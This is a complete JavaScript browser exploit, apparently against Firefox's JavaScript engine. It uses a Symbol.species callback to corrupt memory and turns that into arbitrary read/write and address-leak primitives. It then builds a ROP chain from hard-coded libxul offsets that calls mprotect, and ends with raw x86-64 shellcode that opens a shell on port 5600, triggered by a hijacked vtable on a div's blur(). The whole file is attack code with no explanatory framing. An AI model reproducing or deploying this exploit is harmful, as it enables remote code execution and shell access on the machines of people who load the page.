const Debug = false;
const dbg = p => {
    if (Debug == false) {
        return;
    }

    console.log("Debug: " + p);
};

const ArraySize = 0x5;
const WantedArraySize = 0x42424242;

let arr = null;
let Trigger = false;
const Spray = [];

function f(Special, Idx, Value) {
    arr[Idx] = 0x41414141;
    Special.slice();
    arr[Idx] = Value;
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
                return;
            }

            arr.length = 0;
            for(let i = 0; i < 0x40000; i++) {
                Spray.push(new Uint32Array(ArraySize));
            }
        };
    }
};

function get_me_biggie() {
    for(let Idx = 0; Idx < 0x10000; Idx++) {
        Spray.push(new Uint32Array(ArraySize));
    }

    const SpecialSnowFlake = new SoSpecial();
    for(let Idx = 0; Idx < 1; Idx++) {
        arr = new Array(0x7e);
        Trigger = false;
        for(let Idx = 0; Idx < 0x400; Idx++) {
            f(SpecialSnowFlake, 0x70, Idx);
        }

        Trigger = true;
        f(SpecialSnowFlake, 47, WantedArraySize);
        if(arr.length != 0) {
            continue;
        }

        const Biggie = Spray.find(e => e.length != ArraySize);
        if(Biggie != null) {
            return Biggie;
        }
    }

    return null;
}

function main() {

    // alert(1);

	const fake_vt = new Uint32Array(0x100);
	const sc = new Uint8Array(0x1000);

    const Biggie = get_me_biggie();
    if (Biggie == null || Biggie.length != WantedArraySize) {
        dbg("Failed :-(");
        return;
    }

	dbg('Biggie length: ' + Biggie.length);
	// dbg(Biggie.constructor.name);
    // Biggie[0x11223344] = 0xaaaaaaaa;
	Biggie[0] = 0x41434547;
	Biggie[1] = 0x41434547;

	// let Biggie2ArraySizeOffset = null;
	let Biggie2AdjacentSize = null;
    const JSValueArraySize = new Int64(ArraySize, 0xfff88000);
	dbg(JSValueArraySize.toString());
    for (let Idx = 0; Idx < 0x100; Idx++) {
		const Qword = new Int64(Biggie[Idx * 2], Biggie[Idx * 2 + 1]);
		if (Qword.toString() == JSValueArraySize.toString()) {
			Biggie2AdjacentSize = Idx * 2;
          	break;
        }
    }

	if (Biggie2AdjacentSize == null) {
		dbg("Fail to find adjant array.");
		return;
	}

	const AdjacentArraySize = 0xbbccdd;
	Biggie[Biggie2AdjacentSize] = AdjacentArraySize;

	const AdjacentArray = Spray.find(
        e => e.length == AdjacentArraySize
    );

	if (AdjacentArray == null) {
        dbg("Failed to find the corrupted adjacent array.");
        return;
    }	

	const Read64 = Addr => {
        const SizeInDwords = 2;
        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Addr.lower();
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Addr.upper();
        return new Int64(AdjacentArray[0], AdjacentArray[1]);
    };

	const Write64 = (Addr, Value) => {
        const SizeInDwords = 2;
        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Addr.lower();
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Addr.upper();
        AdjacentArray[0] = Value.lower();
        AdjacentArray[1] = Value.upper();
        return true;
    };

   	const AddrOf = Obj => {
        AdjacentArray.hell_on_earth = Obj;
        const SlotOffset = Biggie2AdjacentSize - (3 * 2);
        const ret = Biggie.slice(SlotOffset, SlotOffset + 2)
		const SlotsAddress = new Int64(ret[0], ret[1]);	
        return Int64.and(Read64(SlotsAddress), new Int64(0xffffffff, 0xffff));	
    };
 
	const emptyElementsHeader = new Int64(Biggie[Biggie2AdjacentSize - 4], Biggie[Biggie2AdjacentSize - 3]);  
    // alert(emptyElementsHeader.toString());

    const libxul_base = Int64.sub(emptyElementsHeader, 
                            new Int64(0x5d462a0, 0));
	const mprotect_got = Int64.add(libxul_base, 
							new Int64(0x7A677E0, 0));
	const mprotect = Read64(mprotect_got);
	const pop_rdi_ret = Int64.add(libxul_base, 
							new Int64(0x21E33BD, 0));
	const pop_rsi_ret = Int64.add(libxul_base, 
							new Int64(0x34070CB, 0));
	const pop_rdx_ret = Int64.add(libxul_base, 
							new Int64(0x3BE9D69, 0));

	const div = document.createElement("div");
	const div_addr = AddrOf(div); 
	const half_div_obj = Read64(
							Int64.add(div_addr, new Int64(0x20, 0)));	
	const div_obj = Int64.add(half_div_obj, half_div_obj);
	const div_vtable = Read64(div_obj);

	const fake_vt_addr = AddrOf(fake_vt);
	const fake_vt_buf_addr = Read64(Int64.add(fake_vt_addr, new Int64(0x38, 0)));

	const sc_obj_addr = AddrOf(sc);
	const sc_addr = Read64(Int64.add(sc_obj_addr, new Int64(0x38, 0)));

	const pivot = Int64.add(libxul_base, new Int64(0x02c6fc4a, 0));
	// blur at 0x200
	// 0x200 / 4 = 0x80
	/* 0x02c6fc4a^[[0m: ^[[92mxchg rax, rsp ; adc byte [rcx-0x7D], al ; ret  ; */		
	fake_vt[0x80] = pivot.lower(); 
	fake_vt[0x81] = pivot.upper();

    /* --- rop --- */
	fake_vt[0] = pop_rdi_ret.lower();
	fake_vt[1] = pop_rdi_ret.upper();

	fake_vt[2] = sc_addr.lower();
	fake_vt[3] = sc_addr.upper();

    fake_vt[4] = pop_rsi_ret.lower();
    fake_vt[5] = pop_rsi_ret.upper();

    fake_vt[6] = 0x1000;
    fake_vt[7] = 0x0;

    fake_vt[8] = pop_rdx_ret.lower();
    fake_vt[9] = pop_rdx_ret.upper();

    fake_vt[10] = 0x7; // rwx
    fake_vt[11] = 0x0;

    fake_vt[12] = mprotect.lower();
    fake_vt[13] = mprotect.upper();

    fake_vt[14] = sc_addr.lower();
    fake_vt[15] = sc_addr.upper();
    /* ----------------- */

	/* --- shellcode --- */
    /* nc localhost 5600 to get a reverse shell */
sc[0] = 0x48
sc[1] = 0x31
sc[2] = 0xc0
sc[3] = 0x48
sc[4] = 0x31
sc[5] = 0xd2
sc[6] = 0x48
sc[7] = 0x31
sc[8] = 0xf6
sc[9] = 0xff
sc[10] = 0xc6
sc[11] = 0x6a
sc[12] = 0x29
sc[13] = 0x58
sc[14] = 0x6a
sc[15] = 0x2
sc[16] = 0x5f
sc[17] = 0xf
sc[18] = 0x5
sc[19] = 0x48
sc[20] = 0x97
sc[21] = 0x6a
sc[22] = 0x2
sc[23] = 0x66
sc[24] = 0xc7
sc[25] = 0x44
sc[26] = 0x24
sc[27] = 0x2
sc[28] = 0x15
sc[29] = 0xe0
sc[30] = 0x54
sc[31] = 0x5e
sc[32] = 0x52
sc[33] = 0x6a
sc[34] = 0x31
sc[35] = 0x58
sc[36] = 0x6a
sc[37] = 0x10
sc[38] = 0x5a
sc[39] = 0xf
sc[40] = 0x5
sc[41] = 0x5e
sc[42] = 0x6a
sc[43] = 0x32
sc[44] = 0x58
sc[45] = 0xf
sc[46] = 0x5
sc[47] = 0x6a
sc[48] = 0x2b
sc[49] = 0x58
sc[50] = 0xf
sc[51] = 0x5
sc[52] = 0x48
sc[53] = 0x97
sc[54] = 0x6a
sc[55] = 0x3
sc[56] = 0x5e
sc[57] = 0xff
sc[58] = 0xce
sc[59] = 0xb0
sc[60] = 0x21
sc[61] = 0xf
sc[62] = 0x5
sc[63] = 0x75
sc[64] = 0xf8
sc[65] = 0xf7
sc[66] = 0xe6
sc[67] = 0x52
sc[68] = 0x48
sc[69] = 0xbb
sc[70] = 0x2f
sc[71] = 0x62
sc[72] = 0x69
sc[73] = 0x6e
sc[74] = 0x2f
sc[75] = 0x2f
sc[76] = 0x73
sc[77] = 0x68
sc[78] = 0x53
sc[79] = 0x48
sc[80] = 0x8d
sc[81] = 0x3c
sc[82] = 0x24
sc[83] = 0xb0
sc[84] = 0x3b
sc[85] = 0xf
sc[86] = 0x5
	/* ------------------ */

	Write64(div_obj, fake_vt_buf_addr);	
	div.blur();
}

main();

